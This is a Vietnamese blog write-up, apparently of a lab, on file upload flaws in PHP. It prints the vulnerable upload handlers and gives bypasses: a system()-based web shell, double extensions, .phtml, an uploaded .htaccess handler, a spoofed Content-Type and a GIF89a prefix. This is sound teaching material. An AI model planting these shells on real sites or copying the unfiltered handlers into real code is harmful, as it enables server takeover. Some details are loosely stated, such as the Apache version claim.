---
title: File Upload Vulnerabilities
date: 2026-04-05 09:30:00 +0700
categories: [write up, Web Pentest]
tags: [Write up, Pentest, RedTeam]
math: true
mermaid: true
---


# File Upload Vulnerabilities
> Là phương thức tấn công dạng unstrusted data dưới dạng file/folder


## Bức tranh tổng quát của Web
### Cách hoạt động của 1 trang web 

![Intercepted Request](assets/img/material_posts/file_upload_vulnerabilities/img1.png){: width="800" height="500" }
_Hình 1: Quy trình cơ bản khi người dùng tương tác và nhận phản hồi._

> Bức tranh tổng quát ở đây là User sẽ tương tác với website/browser sau đó chúng sẽ gửi trực tiếp cho WebServer dựa trên giao thức HTTP. Bên trong WebServer sẽ thực hiện xử lí và đưa ra kết quả trả lạ cho Browser và hiển thị lại cho người dùng


### 2 trường phái xử lí dữ liệu 

![Intercepted Request](assets/img/material_posts/file_upload_vulnerabilities/img2.png){: width="800" height="500" }
_Hình 2: Sự phân nhánh và tương tác giữa client-side và server-side._


* Client-Side (Front-End): Chỉ thực hiện các công việc cụ thể như xử lí hiển thị, xử lí tương tác người dùng và làm đẹp trang web chưa có những chức năng cụ thể để thực hiện xử lí thông tin người dùng, truy vấn database...
* Server-Side (Back-End): Thực hiện xử lí thông tin đầu vào của người dùng, truy vấn và trả về kết quả mong muốn từ database -> Hoàn thiện những điểm yếu của Client-Side giúp server hoạt động nhanh hơn và tiện lợi hơn và các tác vụ nâng cao hơn.


### Cấu trúc bên trong cụ thể của 1 Web Server

![Intercepted Request](assets/img/material_posts/file_upload_vulnerabilities/img3.png){: width="800" height="500" }
_Hình 3: Chi tiết quá trình xử lý yêu cầu đầu vào._

Bên trong Web Server sẽ gồm nhiều phần nhưng ta cần đặc biệt lưu các phần sau: 
1. httpd (HTTP Deamon: Ví dụ Apache/Nginx) - Đây là phần sẽ chịu trách nhiệm xử lí đầu vào, xử lí gói tin (dựa trên những gì mà đã được cấu hình trước đó)
2. Document Root(/var/www/html/) - Hiểu đơn giản thì nó sẽ đại diện cho thư mục mà ở đó có toàn bộ tài nguyên của 1 trang web(cấu hình, tài nguyên hình ảnh, tài nguyên trang web,...)
3. Cuối cùng là ngôn ngữ Server-Side: thay vì xử lí dựa trên httpd thì giờ đây nếu như file thuộc tầm hoạt động của ngôn ngữ ví dụ ở đây là *.php thì nó sẽ thực hiện xử lí sau đó là trả về kết quả cho httpd. 

## Khai thác lỗ File Upload Vulnerabilities
### Level 1: Not Filter Untrusted Data
Đây là mô tả code xử lí php của level 1:
```php
<?php
// error_reporting(0);

// Create folder for each user
session_start();
if (!isset($_SESSION['dir'])) {
    $_SESSION['dir'] = 'upload/' . session_id(); # Dinh nghia dir la trong folder upload la 1 session_id
} 
$dir = $_SESSION['dir'];
if (!file_exists($dir))
    mkdir($dir);
# xu li neu chua co folder thi tao thu muc voi bien dir
if (isset($_GET["debug"])) die(highlight_file(__FILE__));
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $file = $dir . "/" . $_FILES["file"]["name"]; 
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        #line 18-19 la` 2 line quan trong cho thay duoc rang WebServer khong thuc hien filter untrusted data ma cho phep 
        #luu tru vao chinh thu muc goc cua WebServer, dieu nay Attacker co the gui file thuc thi va goi de thuc thi -->tan cong
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```

> Nhận định lỗi ở level 1 đó chính là cho phép người dùng upload file tùy ý lên folder root của webserver (Untrusted Data), chính vì thế người dùng có thể upload và thực thi file bất kì. 


Đây là payload của file exploit.php sau khi đã thực hiện upload và nhờ webserver xử lí tạo web shell
```php
<?php
    if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = $_REQUEST['cmd']; 
        system($cmd); 
        echo "</pre>";
        die; 
    }
# Code này thực hiện chạy web shell khi nhận tham số từ đường truyền vào 
# Điều này giúp ta chạy các lệnh shell
?>
```
Đây là hình ảnh minh họa: 

![Intercepted Request](assets/img/material_posts/file_upload_vulnerabilities/img4.png){: width="800" height="500" }
_Hình 4: Chi tiết khai thác và flag._

### Level 2: Filter File Extension
```php
if (isset($_FILES["file"])) 
{
    $error = '';
    $success = '';
    try {
        $filename = $_FILES["file"]["name"];
        $extension = explode(".", $filename)[1]; # Tuy nhiên điểm yếu chính là dòng này
        # Chỉ thực hiện lộc extension đầu tiên --> Đây là lỗ hổng
        // var_dump($filename); 
        // var_dump($extension);
        if ($extension === "php") {  # Khac voi lv1 thi gio da co filter loc duoi .php
            die("Hack detected");
        }
 
        $file = $dir . "/" . $filename;
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } 
    catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
```

Và vì chỉ lọc Extension đầu tiên chính vì thế ta chọn ra file đánh lừa có dạng **exploit.text.php**, điều này làm cho bộ lọc không còn đúng nữa (Code khai thác tạo webshell tương tự). 

### Level 3: Filter Exactly File Extension 
Đây là phiên bản nâng cấp hơn so với level 2 trước đó, giờ hệ thống đã thực hiện filter vào extension cuối và ta không còn cách nào khác để có thể dựa vào tên file vượt qua bộ lọc. Ta sẽ đi kiếm cách khác. 

Kiểm tra trong hệ thống thì có thể thấy được file **docker-php.conf** có nội dung sau:
```conf 
<FilesMatch ".+\.ph(ar|p|tml)$">
    SetHandler application/x-httpd-php  # day chinh la cau hinh de dua vao tien trinh xu li cua php
    # cac duoi .php, .phar, .phtml --> Deu co the xu li bang php
</FilesMatch>

DirectoryIndex disabled
DirectoryIndex index.php index.html

<LocationMatch ^/upload/$>
    Order deny,allow
    Deny from all
</LocationMatch>
```
> Có thể thấy được trong file cấu trúc này nó có quy ước cách xử lí của những file php mà ta đang hướng tới, server sẽ xử lí những file có extension **php/phar/phtml** điều này mở ra con đường mới giúp chung ta vượt qua bộ lọc chặn extension **.php**

Để giải bài này ta chỉ cần upload lên file chứa code php dưới đuôi phar/phtml là được. 

### Level 4: Filter All File Extension To Process PHP 
Đối với level này cũng là cải tiến hơn so với level 3 trước đó, giờ đây nó đã chặn mọi extension để server có thể xử lí file **php**. Giờ đây ta cần nghĩ cách nào đó để vừa thoát được bộ lọc mà server vẫn hiểu để xử lí file PHP. 

> Ở đây ta cần nắm thêm 1 thông tin đó là có một lỗ hổng từ cơ chế trước đây của apache, file **.htaccess**  từ phiên bản 2.3.8- đã có những lỗ bảo mật khi mà nó có thể quy định về ghi đè được, điều này gây lỗi khá nghiêm trọng. File **.htaccess** sẽ thực hiện quy ước lại toàn bộ cách xử lí với phạm vi là folder chứa nó. 

Ta sẽ tìm hiểu và hiểu rõ hơn qua ví dụ này, lỗ hổng này đã nằm ở phiên bản 2.3.8 trở về trước đó. Về sau tính năng ghi đè **.htaccess** đã bị tắt đi. Đối với level này ta thực hiện khai thác lỗ hổng này bằng cách đăng file **.htaccess** để thay đổi file extension xử lí bằng php. 

File .htaccess có nội dung sau: 
```config
<FilesMatch ".+\.ph(hehe|haha|hihi)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

Điều này đã giúp chúng ta tạo thêm nhiều File Extension để cho httpd có thể nhận biết và đưa cho PHP mode xử  lí file khi gặp đuôi như **.phhehe/.phhaha/.phhihi**


### Level 5: Filter Content Type 
> Đối với Level filter không còn dựa trên file extention mà điều ta cần chú ý đó là **content type**

Đây là code xử lí: 
```php
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $mime_type = $_FILES["file"]["type"];
        var_dump($_FILES);
        if (!in_array($mime_type, ["image/jpeg", "image/png", "image/gif"])) {
            die("Hack detected");
        } # khac voi cac lv khac o lv nay su dung white list != black list 
        # Chi cho nguoi dung dang tai nhung file dang image/jpeg, png, gif --> O day chi check content/type 
        # nhung file khac content/type: "image/jpeg", "image/png", "image/gif" se bi chan
        # Van chua check noi dung ben trong --> Van co kha nang thay doi content/type va chen payload
        $file = $dir . "/" . $_FILES["file"]["name"];
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
```


![Intercepted Request](assets/img/material_posts/file_upload_vulnerabilities/img5.png){: width="800" height="500" }
_Hình 4: Chi tiết khai thác và flag._

Content type: Sẽ định nghĩa xem file mà ta upload sẽ ở dạng gì ? Điều này là thứ mà filter đang nhắm tới. Liệu Filter có thể sửa được không ? 

Đối với level này việc đơn giản là ta chỉ cần sửa đi Content type là có thể khai thác được. 


### Level 6: Filter base on Signature File 
> Đối với bài này, Filter thực hiện lọc file dựa trên Signature File, dễ hiểu đó là những nét đặc trưng mà của 1 thể loại file, và các file thuộc thể loại khác nhau sẽ có Signature File khác nhau

Đây là code xử lí: 
```php
if (isset($_FILES["file"])) {
    $error = '';
    $success = '';
    try {
        $finfo = finfo_open(FILEINFO_MIME_TYPE); # Xem xet Signature File (check nhung byte dau tien de phat hien) 
        #--> Coi noi dung file --> De check file thuoc the loai trong whitelist khong? 
        # Khac voi lv5 la check content type
        $mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
        $whitelist = array("image/jpeg", "image/png", "image/gif");
        if (!in_array($mime_type, $whitelist, TRUE)) {
            die("Hack detected");
        }
        $file = $dir . "/" . $_FILES["file"]["name"];
        move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
        $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
```

Đối với level này sẽ có câu hỏi rằng, liệu ta upload file **.php** nhưng lại mang trên mình signature của 1 file hợp lệ ở đây  có thể là **.GIF** được không ? 

Và đây là nội dung chính của payload.php: 
```php
GIF89a # đây chính là signature của file .GIF 
if (isset($_REQUEST['cmd'])){
    echo"<pre>"; 
    $cmd=$_REQUEST['cmd']; 
    system($cmd); 
    echo"</pre>";
    die;
}
# Đối với payload này mặc dù là đuôi .php nhưng lại có signature file là của file
# GIF điều này giúp bypass được filter
```
